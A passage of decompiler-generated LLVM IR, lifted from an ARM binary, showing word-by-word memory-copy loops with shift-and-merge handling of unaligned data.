  store i32 %v3_158dc, i32* %ip.global-to-local, align 4
  %v0_158e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_158e0 = inttoptr i32 %v0_158e0 to i32*
  %v2_158e0 = load i32, i32* %v1_158e0, align 4
  store i32 %v2_158e0, i32* %lr.global-to-local, align 4
  %v4_158e0 = add i32 %v0_158e0, 4
  store i32 %v4_158e0, i32* %r1.global-to-local, align 4
  %v4_158e4 = mul i32 %v2_158e0, 16777216
  %v5_158e4 = or i32 %v4_158e4, %v3_158dc
  store i32 %v5_158e4, i32* @ip, align 4
  %v2_158e8 = inttoptr i32 %v1_158e8 to i32*
  store i32 %v5_158e4, i32* %v2_158e8, align 4
  %v3_158e8 = load i32, i32* @r0, align 4
  %v4_158e8 = add i32 %v3_158e8, 4
  store i32 %v4_158e8, i32* @r0, align 4
  %v0_158ec = load i32, i32* %r2.global-to-local, align 4
  %v1_158ec = add i32 %v0_158ec, -4
  store i32 %v1_158ec, i32* %r2.global-to-local, align 4
  %v3_158ec = sub i32 3, %v0_158ec
  %v4_158ec = and i32 %v3_158ec, %v0_158ec
  %v5_158ec = icmp slt i32 %v4_158ec, 0
  %v6_158ec = icmp slt i32 %v1_158ec, 0
  %v2_158f0 = xor i1 %v6_158ec, %v5_158ec
  br i1 %v2_158f0, label %dec_label_pc_158f4.loopexit, label %dec_label_pc_158dc

dec_label_pc_158f4.loopexit:                      ; preds = %dec_label_pc_158dc
  %v7_158ec = icmp eq i32 %v0_158ec, 4
  store i1 %v5_158ec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_158ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_158ec, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_158f4

dec_label_pc_158f4:                               ; preds = %dec_label_pc_158f4.loopexit, %dec_label_pc_158d0
  %v0_1581c59 = phi i32 [ %v1_158ec, %dec_label_pc_158f4.loopexit ], [ %v1_158d4, %dec_label_pc_158d0 ]
  %v0_158f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_158f4 = add i32 %v0_158f4, -3
  store i32 %v1_158f4, i32* @r1, align 4
  br label %bb140

dec_label_pc_158fc:                               ; preds = %dec_label_pc_1587c
  br i1 %v2_15900, label %dec_label_pc_15948, label %dec_label_pc_15904

dec_label_pc_15904:                               ; preds = %dec_label_pc_158fc
  store i32 %v1_158fc, i32* %r2.global-to-local, align 4
  %v3_15908 = load i32, i32* @r4, align 4
  store i32 %v3_15908, i32* %stack_var_-16, align 4
  %v6_15908 = load i32, i32* @r5, align 4
  store i32 %v6_15908, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_1590c.dec_label_pc_1590c_crit_edge, %dec_label_pc_15904
  %v0_15930 = phi i32 [ %v12_15930, %dec_label_pc_1590c.dec_label_pc_1590c_crit_edge ], [ %v0_1599c76, %dec_label_pc_15904 ]
  %v0_15910 = phi i32 [ %v0_15910.pre, %dec_label_pc_1590c.dec_label_pc_1590c_crit_edge ], [ %v4_15880, %dec_label_pc_15904 ]
  %v0_1590c = phi i32 [ %v0_1590c.pre, %dec_label_pc_1590c.dec_label_pc_1590c_crit_edge ], [ %v2_15880, %dec_label_pc_15904 ]
  %v3_1590c = udiv i32 %v0_1590c, 65536
  %v1_15910 = inttoptr i32 %v0_15910 to i32*
  %v2_15910 = load i32, i32* %v1_15910, align 4
  store i32 %v2_15910, i32* %r4.global-to-local, align 4
  %v3_15910 = add i32 %v0_15910, 4
  %v4_15910 = inttoptr i32 %v3_15910 to i32*
  %v5_15910 = load i32, i32* %v4_15910, align 4
  store i32 %v5_15910, i32* %r5.global-to-local, align 4
  %v6_15910 = add i32 %v0_15910, 8
  %v7_15910 = inttoptr i32 %v6_15910 to i32*
  %v8_15910 = load i32, i32* %v7_15910, align 4
  store i32 %v8_15910, i32* %ip.global-to-local, align 4
  %v9_15910 = add i32 %v0_15910, 12
  %v10_15910 = inttoptr i32 %v9_15910 to i32*
  %v11_15910 = load i32, i32* %v10_15910, align 4
  store i32 %v11_15910, i32* %lr.global-to-local, align 4
  %v12_15910 = add i32 %v0_15910, 16
  store i32 %v12_15910, i32* %r1.global-to-local, align 4
  %v4_15914 = mul i32 %v2_15910, 65536
  %v5_15914 = or i32 %v4_15914, %v3_1590c
  store i32 %v5_15914, i32* @r3, align 4
  %v3_15918 = udiv i32 %v2_15910, 65536
  %v4_1591c = mul i32 %v5_15910, 65536
  %v5_1591c = or i32 %v4_1591c, %v3_15918
  store i32 %v5_1591c, i32* %r4.global-to-local, align 4
  %v3_15920 = udiv i32 %v5_15910, 65536
  %v4_15924 = mul i32 %v8_15910, 65536
  %v5_15924 = or i32 %v4_15924, %v3_15920
  store i32 %v5_15924, i32* %r5.global-to-local, align 4
  %v3_15928 = udiv i32 %v8_15910, 65536
  %v4_1592c = mul i32 %v11_15910, 65536
  %v5_1592c = or i32 %v4_1592c, %v3_15928
  store i32 %v5_1592c, i32* @ip, align 4
  %v1_15930 = inttoptr i32 %v0_15930 to i32*
  store i32 %v5_15914, i32* %v1_15930, align 4
  %v3_15930 = add i32 %v0_15930, 4
  %v4_15930 = inttoptr i32 %v3_15930 to i32*
  %v5_15930 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15930, i32* %v4_15930, align 4
  %v6_15930 = add i32 %v0_15930, 8
  %v7_15930 = inttoptr i32 %v6_15930 to i32*
  %v8_15930 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15930, i32* %v7_15930, align 4
  %v9_15930 = add i32 %v0_15930, 12
  %v10_15930 = inttoptr i32 %v9_15930 to i32*
  %v11_15930 = load i32, i32* @ip, align 4
  store i32 %v11_15930, i32* %v10_15930, align 4
  %v12_15930 = add i32 %v0_15930, 16
  store i32 %v12_15930, i32* @r0, align 4
  %v0_15934 = load i32, i32* %r2.global-to-local, align 4
  %v1_15934 = add i32 %v0_15934, -16
  store i32 %v1_15934, i32* %r2.global-to-local, align 4
  %v3_15934 = sub i32 15, %v0_15934
  %v4_15934 = and i32 %v3_15934, %v0_15934
  %v5_15934 = icmp slt i32 %v4_15934, 0
  %v6_15934 = icmp slt i32 %v1_15934, 0
  %v2_15938 = xor i1 %v6_15934, %v5_15934
  br i1 %v2_15938, label %dec_label_pc_1593c, label %dec_label_pc_1590c.dec_label_pc_1590c_crit_edge

dec_label_pc_1590c.dec_label_pc_1590c_crit_edge:  ; preds = %dec_label_pc_1590c
  %v0_1590c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15910.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1593c:                               ; preds = %dec_label_pc_1590c
  %v2_1593c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1593c, i32* @r4, align 4
  %v5_1593c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1593c, i32* @r5, align 4
  %v1_15940 = add i32 %v0_15934, -4
  store i32 %v1_15940, i32* %r2.global-to-local, align 4
  %v3_15940 = add i32 %v0_15934, 2147483632
  %v4_15940 = and i32 %v1_15940, %v3_15940
  %v5_15940 = icmp slt i32 %v4_15940, 0
  store i1 %v5_15940, i1* %cpsr_v.global-to-local, align 1
  %v6_15940 = icmp slt i32 %v1_15940, 0
  store i1 %v6_15940, i1* %cpsr_n.global-to-local, align 1
  %v7_15940 = icmp eq i32 %v1_15940, 0
  store i1 %v7_15940, i1* %cpsr_z.global-to-local, align 1
  %v2_15944 = xor i1 %v6_15940, %v5_15940
  br i1 %v2_15944, label %dec_label_pc_15960, label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %dec_label_pc_1593c, %dec_label_pc_158fc, %dec_label_pc_15948
  %v1_15954 = phi i32 [ %v4_15954, %dec_label_pc_15948 ], [ %v12_15930, %dec_label_pc_1593c ], [ %v0_1599c76, %dec_label_pc_158fc ]
  %v0_15948 = load i32, i32* %lr.global-to-local, align 4
  %v3_15948 = udiv i32 %v0_15948, 65536
  store i32 %v3_15948, i32* %ip.global-to-local, align 4
  %v0_1594c = load i32, i32* %r1.global-to-local, align 4
  %v1_1594c = inttoptr i32 %v0_1594c to i32*
  %v2_1594c = load i32, i32* %v1_1594c, align 4
  store i32 %v2_1594c, i32* %lr.global-to-local, align 4
  %v4_1594c = add i32 %v0_1594c, 4
  store i32 %v4_1594c, i32* %r1.global-to-local, align 4
  %v4_15950 = mul i32 %v2_1594c, 65536
  %v5_15950 = or i32 %v4_15950, %v3_15948
  store i32 %v5_15950, i32* @ip, align 4
  %v2_15954 = inttoptr i32 %v1_15954 to i32*
  store i32 %v5_15950, i32* %v2_15954, align 4
  %v3_15954 = load i32, i32* @r0, align 4
  %v4_15954 = add i32 %v3_15954, 4
  store i32 %v4_15954, i32* @r0, align 4
  %v0_15958 = load i32, i32* %r2.global-to-local, align 4
  %v1_15958 = add i32 %v0_15958, -4
  store i32 %v1_15958, i32* %r2.global-to-local, align 4
  %v3_15958 = sub i32 3, %v0_15958
  %v4_15958 = and i32 %v3_15958, %v0_15958
  %v5_15958 = icmp slt i32 %v4_15958, 0
  %v6_15958 = icmp slt i32 %v1_15958, 0
  %v2_1595c = xor i1 %v6_15958, %v5_15958
  br i1 %v2_1595c, label %dec_label_pc_15960.loopexit, label %dec_label_pc_15948

dec_label_pc_15960.loopexit:                      ; preds = %dec_label_pc_15948
  %v7_15958 = icmp eq i32 %v0_15958, 4
  store i1 %v5_15958, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15958, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15958, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15960

dec_label_pc_15960:                               ; preds = %dec_label_pc_15960.loopexit, %dec_label_pc_1593c
  %v0_1581c60 = phi i32 [ %v1_15958, %dec_label_pc_15960.loopexit ], [ %v1_15940, %dec_label_pc_1593c ]
  %v0_15960 = load i32, i32* %r1.global-to-local, align 4
  %v1_15960 = add i32 %v0_15960, -2
  store i32 %v1_15960, i32* @r1, align 4
  br label %bb140

dec_label_pc_15968:                               ; preds = %dec_label_pc_1587c
  br i1 %v2_15900, label %dec_label_pc_159b4, label %dec_label_pc_15970

dec_label_pc_15970:                               ; preds = %dec_label_pc_15968
  store i32 %v1_158fc, i32* %r2.global-to-local, align 4
  %v3_15974 = load i32, i32* @r4, align 4
  store i32 %v3_15974, i32* %stack_var_-16, align 4
  %v6_15974 = load i32, i32* @r5, align 4
  store i32 %v6_15974, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_15978.dec_label_pc_15978_crit_edge, %dec_label_pc_15970
  %v0_1599c = phi i32 [ %v12_1599c, %dec_label_pc_15978.dec_label_pc_15978_crit_edge ], [ %v0_1599c76, %dec_label_pc_15970 ]
  %v0_1597c = phi i32 [ %v0_1597c.pre, %dec_label_pc_15978.dec_label_pc_15978_crit_edge ], [ %v4_15880, %dec_label_pc_15970 ]
  %v0_15978 = phi i32 [ %v0_15978.pre, %dec_label_pc_15978.dec_label_pc_15978_crit_edge ], [ %v2_15880, %dec_label_pc_15970 ]
  %v3_15978 = udiv i32 %v0_15978, 16777216
  %v1_1597c = inttoptr i32 %v0_1597c to i32*
  %v2_1597c = load i32, i32* %v1_1597c, align 4
  store i32 %v2_1597c, i32* %r4.global-to-local, align 4
  %v3_1597c = add i32 %v0_1597c, 4
  %v4_1597c = inttoptr i32 %v3_1597c to i32*
  %v5_1597c = load i32, i32* %v4_1597c, align 4
  store i32 %v5_1597c, i32* %r5.global-to-local, align 4
  %v6_1597c = add i32 %v0_1597c, 8
  %v7_1597c = inttoptr i32 %v6_1597c to i32*
  %v8_1597c = load i32, i32* %v7_1597c, align 4
  store i32 %v8_1597c, i32* %ip.global-to-local, align 4
  %v9_1597c = add i32 %v0_1597c, 12
  %v10_1597c = inttoptr i32 %v9_1597c to i32*
  %v11_1597c = load i32, i32* %v10_1597c, align 4
  store i32 %v11_1597c, i32* %lr.global-to-local, align 4
  %v12_1597c = add i32 %v0_1597c, 16
  store i32 %v12_1597c, i32* %r1.global-to-local, align 4
  %v4_15980 = mul i32 %v2_1597c, 256
  %v5_15980 = or i32 %v4_15980, %v3_15978
  store i32 %v5_15980, i32* @r3, align 4
  %v3_15984 = udiv i32 %v2_1597c, 16777216
  %v4_15988 = mul i32 %v5_1597c, 256
  %v5_15988 = or i32 %v4_15988, %v3_15984
  store i32 %v5_15988, i32* %r4.global-to-local, align 4
  %v3_1598c = udiv i32 %v5_1597c, 16777216
  %v4_15990 = mul i32 %v8_1597c, 256
  %v5_15990 = or i32 %v4_15990, %v3_1598c
  store i32 %v5_15990, i32* %r5.global-to-local, align 4
  %v3_15994 = udiv i32 %v8_1597c, 16777216
  %v4_15998 = mul i32 %v11_1597c, 256
  %v5_15998 = or i32 %v4_15998, %v3_15994
  store i32 %v5_15998, i32* @ip, align 4
  %v1_1599c = inttoptr i32 %v0_1599c to i32*
  store i32 %v5_15980, i32* %v1_1599c, align 4
  %v3_1599c = add i32 %v0_1599c, 4
  %v4_1599c = inttoptr i32 %v3_1599c to i32*
  %v5_1599c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1599c, i32* %v4_1599c, align 4
  %v6_1599c = add i32 %v0_1599c, 8
  %v7_1599c = inttoptr i32 %v6_1599c to i32*
  %v8_1599c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1599c, i32* %v7_1599c, align 4
  %v9_1599c = add i32 %v0_1599c, 12
  %v10_1599c = inttoptr i32 %v9_1599c to i32*
  %v11_1599c = load i32, i32* @ip, align 4
  store i32 %v11_1599c, i32* %v10_1599c, align 4
  %v12_1599c = add i32 %v0_1599c, 16
  store i32 %v12_1599c, i32* @r0, align 4
  %v0_159a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_159a0 = add i32 %v0_159a0, -16
  store i32 %v1_159a0, i32* %r2.global-to-local, align 4
  %v3_159a0 = sub i32 15, %v0_159a0
  %v4_159a0 = and i32 %v3_159a0, %v0_159a0
  %v5_159a0 = icmp slt i32 %v4_159a0, 0
  %v6_159a0 = icmp slt i32 %v1_159a0, 0
  %v2_159a4 = xor i1 %v6_159a0, %v5_159a0
  br i1 %v2_159a4, label %dec_label_pc_159a8, label %dec_label_pc_15978.dec_label_pc_15978_crit_edge

dec_label_pc_15978.dec_label_pc_15978_crit_edge:  ; preds = %dec_label_pc_15978
  %v0_15978.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1597c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15978

dec_label_pc_159a8:                               ; preds = %dec_label_pc_15978
  %v2_159a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_159a8, i32* @r4, align 4
  %v5_159a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_159a8, i32* @r5, align 4
  %v1_159ac = add i32 %v0_159a0, -4
  store i32 %v1_159ac, i32* %r2.global-to-local, align 4
  %v3_159ac = add i32 %v0_159a0, 2147483632
  %v4_159ac = and i32 %v1_159ac, %v3_159ac
  %v5_159ac = icmp slt i32 %v4_159ac, 0
  store i1 %v5_159ac, i1* %cpsr_v.global-to-local, align 1
  %v6_159ac = icmp slt i32 %v1_159ac, 0
  store i1 %v6_159ac, i1* %cpsr_n.global-to-local, align 1
  %v7_159ac = icmp eq i32 %v1_159ac, 0
  store i1 %v7_159ac, i1* %cpsr_z.global-to-local, align 1
  %v2_159b0 = xor i1 %v6_159ac, %v5_159ac
  br i1 %v2_159b0, label %dec_label_pc_159cc, label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159a8, %dec_label_pc_15968, %dec_label_pc_159b4
  %v1_159c0 = phi i32 [ %v4_159c0, %dec_label_pc_159b4 ], [ %v12_1599c, %dec_label_pc_159a8 ], [ %v0_1599c76, %dec_label_pc_15968 ]
  %v0_159b4 = load i32, i32* %lr.global-to-local, align 4
  %v3_159b4 = udiv i32 %v0_159b4, 16777216
  store i32 %v3_159b4, i32* %ip.global-to-local, align 4
  %v0_159b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_159b8 = inttoptr i32 %v0_159b8 to i32*
  %v2_159b8 = load i32, i32* %v1_159b8, align 4
  store i32 %v2_159b8, i32* %lr.global-to-local, align 4
  %v4_159b8 = add i32 %v0_159b8, 4
  store i32 %v4_159b8, i32* %r1.global-to-local, align 4
  %v4_159bc = mul i32 %v2_159b8, 256
  %v5_159bc = or i32 %v4_159bc, %v3_159b4
  store i32 %v5_159bc, i32* @ip, align 4
  %v2_159c0 = inttoptr i32 %v1_159c0 to i32*
  store i32 %v5_159bc, i32* %v2_159c0, align 4
  %v3_159c0 = load i32, i32* @r0, align 4
  %v4_159c0 = add i32 %v3_159c0, 4
  store i32 %v4_159c0, i32* @r0, align 4
  %v0_159c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_159c4 = add i32 %v0_159c4, -4
  store i32 %v1_159c4, i32* %r2.global-to-local, align 4
  %v3_159c4 = sub i32 3, %v0_159c4
  %v4_159c4 = and i32 %v3_159c4, %v0_159c4
  %v5_159c4 = icmp slt i32 %v4_159c4, 0
  %v6_159c4 = icmp slt i32 %v1_159c4, 0
  %v2_159c8 = xor i1 %v6_159c4, %v5_159c4
  br i1 %v2_159c8, label %dec_label_pc_159cc.loopexit, label %dec_label_pc_159b4

dec_label_pc_159cc.loopexit:                      ; preds = %dec_label_pc_159b4
  %v7_159c4 = icmp eq i32 %v0_159c4, 4
  store i1 %v5_159c4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_159c4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_159c4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_159cc

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159cc.loopexit, %dec_label_pc_159a8
  %v0_1581c61 = phi i32 [ %v1_159c4, %dec_label_pc_159cc.loopexit ], [ %v1_159ac, %dec_label_pc_159a8 ]
  %v0_159cc = load i32, i32* %r1.global-to-local, align 4
  %v1_159cc = add i32 %v0_159cc, -1
  store i32 %v1_159cc, i32* @r1, align 4
  br label %bb140

dec_label_pc_159d4:                               ; preds = %entry
  %v1_159d4 = load i32, i32* @r2, align 4
  %v2_159d4 = add i32 %v1_159d4, %v0_15780
  store i32 %v2_159d4, i32* %r1.global-to-local, align 4
  %v2_159d8 = add i32 %v1_159d4, %v1_15780
  store i32 %v2_159d8, i32* %r0.global-to-local, align 4
  %v2_159dc = add i32 %v1_159d4, -4
  store i32 %v2_159dc, i32* %r2.global-to-local, align 4
  %v4_159dc = sub i32 3, %v1_159d4
  %v5_159dc = and i32 %v4_159dc, %v1_159d4
  %v6_159dc = icmp slt i32 %v5_159dc, 0
  store i1 %v6_159dc, i1* %cpsr_v.global-to-local, align 1
  %v7_159dc = icmp slt i32 %v2_159dc, 0
  store i1 %v7_159dc, i1* %cpsr_n.global-to-local, align 1
  %v8_159dc = icmp eq i32 %v1_159d4, 4
  store i1 %v8_159dc, i1* %cpsr_z.global-to-local, align 1
  %v5_159e0 = icmp slt i32 %v1_159d4, 4
  br i1 %v5_159e0, label %bb150, label %dec_label_pc_159e4

dec_label_pc_159e4:                               ; preds = %dec_label_pc_159d4
  %v1_159e4 = urem i32 %v2_159d8, 4
  store i32 %v1_159e4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159e4 = icmp eq i32 %v1_159e4, 0
  store i1 %v2_159e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159e4, label %dec_label_pc_159ec, label %dec_label_pc_15a8c

dec_label_pc_159ec:                               ; preds = %dec_label_pc_159e4
  %v1_159ec = urem i32 %v2_159d4, 4
  store i32 %v1_159ec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159ec = icmp eq i32 %v1_159ec, 0
  store i1 %v2_159ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159ec, label %dec_label_pc_159f4, label %dec_label_pc_15ab8

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159ec, %dec_label_pc_15ab0
  %v0_15a0c37 = phi i32 [ %v2_159d8, %dec_label_pc_159ec ], [ %v0_15b0020, %dec_label_pc_15ab0 ]
  %v0_15a0836 = phi i32 [ %v2_159d4, %dec_label_pc_159ec ], [ %v0_15ab0, %dec_label_pc_15ab0 ]
  %v0_159f4 = phi i32 [ %v2_159dc, %dec_label_pc_159ec ], [ %v2_15aa8, %dec_label_pc_15ab0 ]
  %v2_159f4 = add i32 %v0_159f4, -8
  store i32 %v2_159f4, i32* %r2.global-to-local, align 4
  %v4_159f4 = sub i32 7, %v0_159f4
  %v5_159f4 = and i32 %v4_159f4, %v0_159f4
  %v6_159f4 = icmp slt i32 %v5_159f4, 0
  store i1 %v6_159f4, i1* %cpsr_v.global-to-local, align 1
  %v7_159f4 = icmp slt i32 %v2_159f4, 0
  store i1 %v7_159f4, i1* %cpsr_n.global-to-local, align 1
  %v8_159f4 = icmp eq i32 %v0_159f4, 8
  store i1 %v8_159f4, i1* %cpsr_z.global-to-local, align 1
  %v5_159f8 = icmp slt i32 %v0_159f4, 8
  br i1 %v5_159f8, label %dec_label_pc_15a44, label %dec_label_pc_159fc

dec_label_pc_159fc:                               ; preds = %dec_label_pc_159f4
  %v3_159fc = load i32, i32* @r4, align 4
  %v5_159fc = inttoptr i32 %v3_159fc to i8*
  store i8* %v5_159fc, i8** %stack_var_-8, align 4
  %v8_159fc = load i32, i32* @lr, align 4
  %v2_15a00 = add i32 %v0_159f4, -28
  store i32 %v2_15a00, i32* %r2.global-to-local, align 4
  %v4_15a00 = sub i32 27, %v0_159f4
  %v5_15a00 = and i32 %v4_15a00, %v2_159f4
  %v6_15a00 = icmp slt i32 %v5_15a00, 0
  store i1 %v6_15a00, i1* %cpsr_v.global-to-local, align 1
  %v7_15a00 = icmp slt i32 %v2_15a00, 0
  store i1 %v7_15a00, i1* %cpsr_n.global-to-local, align 1
  %v8_15a00 = icmp eq i32 %v2_159f4, 20
  store i1 %v8_15a00, i1* %cpsr_z.global-to-local, align 1
  %v5_15a04 = icmp slt i32 %v2_159f4, 20
  br i1 %v5_15a04, label %dec_label_pc_15a20, label %dec_label_pc_15a08

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159fc, %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge
  %v0_15a0c = phi i32 [ %v1_15a14, %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge ], [ %v0_15a0c37, %dec_label_pc_159fc ]
  %v0_15a08 = phi i32 [ %v0_15a08.pre, %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge ], [ %v0_15a0836, %dec_label_pc_159fc ]
  %v1_15a08 = add i32 %v0_15a08, -4
  %v2_15a08 = inttoptr i32 %v1_15a08 to i32*
  %v3_15a08 = load i32, i32* %v2_15a08, align 4
  %v4_15a08 = add i32 %v0_15a08, -8
  %v5_15a08 = inttoptr i32 %v4_15a08 to i32*
  %v6_15a08 = load i32, i32* %v5_15a08, align 4
  store i32 %v6_15a08, i32* %r4.global-to-local, align 4
  %v7_15a08 = add i32 %v0_15a08, -12
  %v8_15a08 = inttoptr i32 %v7_15a08 to i32*
  %v9_15a08 = load i32, i32* %v8_15a08, align 4
  store i32 %v9_15a08, i32* %ip.global-to-local, align 4
  %v10_15a08 = add i32 %v0_15a08, -16
  %v11_15a08 = inttoptr i32 %v10_15a08 to i32*
  %v12_15a08 = load i32, i32* %v11_15a08, align 4
  store i32 %v12_15a08, i32* %lr.global-to-local, align 4
  store i32 %v10_15a08, i32* %r1.global-to-local, align 4
  %v1_15a0c = add i32 %v0_15a0c, -16
  %v2_15a0c = inttoptr i32 %v1_15a0c to i32*
  store i32 %v3_15a08, i32* %v2_15a0c, align 4
  %v4_15a0c = add i32 %v0_15a0c, -12
  %v5_15a0c = inttoptr i32 %v4_15a0c to i32*
  %v6_15a0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15a0c, i32* %v5_15a0c, align 4
  %v7_15a0c = add i32 %v0_15a0c, -8
  %v8_15a0c = inttoptr i32 %v7_15a0c to i32*
  %v9_15a0c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15a0c, i32* %v8_15a0c, align 4
  %v10_15a0c = add i32 %v0_15a0c, -4
  %v11_15a0c = inttoptr i32 %v10_15a0c to i32*
  %v12_15a0c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15a0c, i32* %v11_15a0c, align 4
  store i32 %v1_15a0c, i32* %r0.global-to-local, align 4
  %v0_15a10 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a10 = add i32 %v0_15a10, -4
  %v2_15a10 = inttoptr i32 %v1_15a10 to i32*
  %v3_15a10 = load i32, i32* %v2_15a10, align 4
  store i32 %v3_15a10, i32* @r3, align 4
  %v4_15a10 = add i32 %v0_15a10, -8
  %v5_15a10 = inttoptr i32 %v4_15a10 to i32*
  %v6_15a10 = load i32, i32* %v5_15a10, align 4
  store i32 %v6_15a10, i32* %r4.global-to-local, align 4
  %v7_15a10 = add i32 %v0_15a10, -12
  %v8_15a10 = inttoptr i32 %v7_15a10 to i32*
  %v9_15a10 = load i32, i32* %v8_15a10, align 4
  store i32 %v9_15a10, i32* @ip, align 4
  %v10_15a10 = add i32 %v0_15a10, -16
  %v11_15a10 = inttoptr i32 %v10_15a10 to i32*
  %v12_15a10 = load i32, i32* %v11_15a10, align 4
  store i32 %v12_15a10, i32* %lr.global-to-local, align 4
  store i32 %v10_15a10, i32* %r1.global-to-local, align 4
  %v1_15a14 = add i32 %v0_15a0c, -32
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  store i32 %v3_15a10, i32* %v2_15a14, align 4
  %v4_15a14 = add i32 %v0_15a0c, -28
  %v5_15a14 = inttoptr i32 %v4_15a14 to i32*
  %v6_15a14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15a14, i32* %v5_15a14, align 4
  %v7_15a14 = add i32 %v0_15a0c, -24
  %v8_15a14 = inttoptr i32 %v7_15a14 to i32*
  %v9_15a14 = load i32, i32* @ip, align 4
  store i32 %v9_15a14, i32* %v8_15a14, align 4
  %v10_15a14 = add i32 %v0_15a0c, -20
  %v11_15a14 = inttoptr i32 %v10_15a14 to i32*
  %v12_15a14 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15a14, i32* %v11_15a14, align 4
  store i32 %v1_15a14, i32* %r0.global-to-local, align 4
  %v0_15a18 = load i32, i32* %r2.global-to-local, align 4
  %v2_15a18 = add i32 %v0_15a18, -32
  store i32 %v2_15a18, i32* %r2.global-to-local, align 4
  %v6_15a1c = icmp slt i32 %v0_15a18, 32
  br i1 %v6_15a1c, label %dec_label_pc_15a20.loopexit, label %dec_label_pc_15a08.dec_label_pc_15a08_crit_edge

dec_label_pc_15a08.dec_label_pc_15a08_crit_edge:  ; preds = %dec_label_pc_15a08
  %v0_15a08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a08

dec_label_pc_15a20.loopexit:                      ; preds = %dec_label_pc_15a08
  %v4_15a18 = sub i32 31, %v0_15a18
  %v5_15a18 = and i32 %v4_15a18, %v0_15a18
  %v6_15a18 = icmp slt i32 %v5_15a18, 0
  %v7_15a18 = icmp slt i32 %v2_15a18, 0
  store i1 %v6_15a18, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15a18, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a20

dec_label_pc_15a20:                               ; preds = %dec_label_pc_15a20.loopexit, %dec_label_pc_159fc
  %v6_15a28 = phi i32 [ %v1_15a14, %dec_label_pc_15a20.loopexit ], [ %v0_15a0c37, %dec_label_pc_159fc ]
  %v0_15a30.pr = phi i32 [ %v2_15a18, %dec_label_pc_15a20.loopexit ], [ %v2_15a00, %dec_label_pc_159fc ]
  %v4_15a20 = add i32 %v0_15a30.pr, 16
  %v6_15a20 = sub i32 0, %v0_15a30.pr
  %v7_15a20 = and i32 %v4_15a20, %v6_15a20
  %v8_15a20 = icmp slt i32 %v7_15a20, 0
  store i1 %v8_15a20, i1* %cpsr_v.global-to-local, align 1
  %v9_15a20 = icmp slt i32 %v4_15a20, 0
  store i1 %v9_15a20, i1* %cpsr_n.global-to-local, align 1
  %v10_15a20 = icmp eq i32 %v4_15a20, 0
  store i1 %v10_15a20, i1* %cpsr_z.global-to-local, align 1
  %v5_15a24 = icmp slt i32 %v0_15a30.pr, -16
  br i1 %v5_15a24, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_15a20
  %v6_15a24 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a24 = add i32 %v6_15a24, -4
  %v8_15a24 = inttoptr i32 %v7_15a24 to i32*
  %v9_15a24 = load i32, i32* %v8_15a24, align 4
  store i32 %v9_15a24, i32* @r3, align 4
  %v10_15a24 = add i32 %v6_15a24, -8
  %v11_15a24 = inttoptr i32 %v10_15a24 to i32*
  %v12_15a24 = load i32, i32* %v11_15a24, align 4
  store i32 %v12_15a24, i32* %r4.global-to-local, align 4
  %v13_15a24 = add i32 %v6_15a24, -12
  %v14_15a24 = inttoptr i32 %v13_15a24 to i32*
  %v15_15a24 = load i32, i32* %v14_15a24, align 4
  store i32 %v15_15a24, i32* @ip, align 4
  %v16_15a24 = add i32 %v6_15a24, -16
  %v17_15a24 = inttoptr i32 %v16_15a24 to i32*
  %v18_15a24 = load i32, i32* %v17_15a24, align 4
  store i32 %v18_15a24, i32* %lr.global-to-local, align 4
  store i32 %v16_15a24, i32* %r1.global-to-local, align 4
  %v7_15a28 = add i32 %v6_15a28, -16
